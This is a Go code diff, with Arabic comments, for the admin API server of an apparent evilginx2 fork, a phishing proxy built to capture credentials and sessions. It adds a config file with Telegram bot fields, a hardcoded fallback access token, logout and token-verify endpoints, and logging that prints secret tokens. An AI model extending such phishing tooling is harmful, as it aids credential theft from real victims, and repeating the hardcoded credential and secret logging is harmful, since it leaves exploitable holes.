@@ -5,12 +5,12 @@ import (
 	"fmt"
 	stdlib_log "log"
 	"net/http"
-	"os"
 	"strconv"
 	"strings"
 	"time"
 	"encoding/base64"
 	"math/rand"
+	"os"
 
 	"github.com/gorilla/mux"
 	"github.com/kgretzky/evilginx2/database"
@@ -35,7 +35,7 @@ type ApiServer struct {
 	auth_tokens map[string]time.Time
 	admin_username string
 	admin_password string
-	userToken   string  // توكن المستخدم للتحقق
+	userToken string
 }
 
 type ApiResponse struct {
@@ -47,6 +47,17 @@ type ApiResponse struct {
 // Auth لمعالجة المصادقة
 type Auth struct {
 	apiServer *ApiServer
+}
+
+// هيكل تكوين المستخدم
+type UserConfig struct {
+	Telegram struct {
+		BotToken string `json:"bot_token"`
+		ChatID   string `json:"chat_id"`
+	} `json:"telegram"`
+	Auth struct {
+		UserToken string `json:"userToken"`
+	} `json:"auth"`
 }
 
 // NewApiServer ينشئ خادم API جديد
@@ -62,12 +73,33 @@ func NewApiServer(host string, port int, admin_username string, admin_password s
 	// إنشاء توكن مصادقة فريد
 	token := generateRandomToken(32)
 	
-	// قراءة توكن المستخدم من ملف userConfig.json
-	userToken, err := readUserTokenFromConfig()
-	if err != nil {
-		log.Error("فشل في قراءة توكن المستخدم: %v", err)
-		// استخدام قيمة افتراضية
-		userToken = "JEMEX_FISHER_2024"
+	// قراءة ملف تكوين المستخدم
+	var userToken string = "JEMEX_FISHER_2024" // قيمة افتراضية
+	
+	// محاولة قراءة ملف userConfig.json
+	configFilePath := "userConfig.json"
+	if _, err := os.Stat(configFilePath); err == nil {
+		// الملف موجود، قراءة محتواه
+		fileData, err := os.ReadFile(configFilePath)
+		if err != nil {
+			log.Warning("فشل في قراءة ملف userConfig.json: %v", err)
+		} else {
+			var userConfig UserConfig
+			err = json.Unmarshal(fileData, &userConfig)
+			if err != nil {
+				log.Warning("فشل في تحليل ملف userConfig.json: %v", err)
+			} else {
+				// استخراج قيمة userToken
+				if userConfig.Auth.UserToken != "" {
+					userToken = userConfig.Auth.UserToken
+					log.Info("تم استخراج userToken من ملف التكوين: %s", userToken)
+				} else {
+					log.Warning("لم يتم العثور على userToken في ملف التكوين، استخدام القيمة الافتراضية")
+				}
+			}
+		}
+	} else {
+		log.Warning("ملف userConfig.json غير موجود، استخدام قيمة userToken الافتراضية")
 	}
 	
 	return &ApiServer{
@@ -82,37 +114,8 @@ func NewApiServer(host string, port int, admin_username string, admin_password s
 		admin_username: admin_username,
 		admin_password: admin_password,
 		authToken:  token,
-		userToken: userToken,           // تعيين توكن المستخدم
+		userToken: userToken,           // تعيين userToken
 	}, nil
-}
-
-// دالة جديدة لقراءة توكن المستخدم من ملف userConfig.json
-func readUserTokenFromConfig() (string, error) {
-	// فتح الملف
-	file, err := os.Open("userConfig.json")
-	if err != nil {
-		return "", err
-	}
-	defer file.Close()
-	
-	// قراءة الملف
-	var config struct {
-		Auth struct {
-			UserToken string `json:"userToken"`
-		} `json:"auth"`
-	}
-	
-	decoder := json.NewDecoder(file)
-	if err := decoder.Decode(&config); err != nil {
-		return "", err
-	}
-	
-	// التحقق من وجود التوكن
-	if config.Auth.UserToken == "" {
-		return "", fmt.Errorf("توكن المستخدم غير موجود في ملف التكوين")
-	}
-	
-	return config.Auth.UserToken, nil
 }
 
 // توليد توكن عشوائي بطول محدد
@@ -152,6 +155,10 @@ func (as *ApiServer) Start() {
 
 	// طرق API للمصادقة
 	router.HandleFunc("/api/login", as.loginHandler).Methods("POST")
+	router.HandleFunc("/api/logout", as.logoutHandler).Methods("POST")
+	
+	// إضافة معالج جديد للتحقق من توكن
+	router.HandleFunc("/auth/verify", as.verifyTokenHandler).Methods("POST")
 
 	// إنشاء middleware للمصادقة
 	auth := &Auth{
@@ -1345,4 +1352,78 @@ func min(a, b int) int {
 		return a
 	}
 	return b
+}
+
+// إضافة دالة تسجيل الخروج
+func (as *ApiServer) logoutHandler(w http.ResponseWriter, r *http.Request) {
+	// مسح كوكي التوكن
+	http.SetCookie(w, &http.Cookie{
+		Name:     "Authorization",
+		Value:    "",
+		Path:     "/",
+		HttpOnly: true,
+		Secure:   true,
+		SameSite: http.SameSiteStrictMode,
+		MaxAge:   -1, // حذف الكوكي
+	})
+	
+	// رد ناجح
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: "تم تسجيل الخروج بنجاح",
+	})
+}
+
+// إضافة معالج تحقق توكن
+func (as *ApiServer) verifyTokenHandler(w http.ResponseWriter, r *http.Request) {
+	// التحقق من طريقة الطلب
+	if r.Method != "POST" {
+		http.Error(w, "طريقة غير مدعومة", http.StatusMethodNotAllowed)
+		return
+	}
+	
+	// فك تشفير طلب JSON
+	var loginReq LoginRequest
+	err := json.NewDecoder(r.Body).Decode(&loginReq)
+	if err != nil {
+		as.jsonError(w, "خطأ في تنسيق البيانات: "+err.Error(), http.StatusBadRequest)
+		return
+	}
+	
+	// طباعة معلومات التصحيح
+	log.Debug("محاولة التحقق من توكن: %s", loginReq.UserToken)
+	
+	// التحقق من صحة التوكن
+	if loginReq.UserToken != as.userToken {
+		log.Warning("محاولة تحقق فاشلة باستخدام توكن غير صحيح")
+		as.jsonError(w, "توكن الوصول غير صحيح", http.StatusUnauthorized)
+		return
+	}
+	
+	// توليد رمز جلسة جديد
+	sessionToken := generateRandomToken(32)
+	
+	// تخزين رمز الجلسة
+	as.authToken = sessionToken
+	
+	// تعيين كوكي للمصادقة
+	http.SetCookie(w, &http.Cookie{
+		Name:     "Authorization",
+		Value:    sessionToken,
+		Path:     "/",
+		HttpOnly: true,
+		Secure:   true,
+		SameSite: http.SameSiteStrictMode,
+		MaxAge:   86400, // 24 ساعة
+	})
+	
+	// استجابة ناجحة
+	log.Success("تم التحقق من التوكن بنجاح وإصدار توكن جلسة: %s", sessionToken)
+	as.jsonResponse(w, ApiResponse{
+		Success: true,
+		Message: "تم التحقق من التوكن بنجاح",
+		Data: map[string]string{
+			"auth_token": sessionToken,
+		},
+	})
 } 
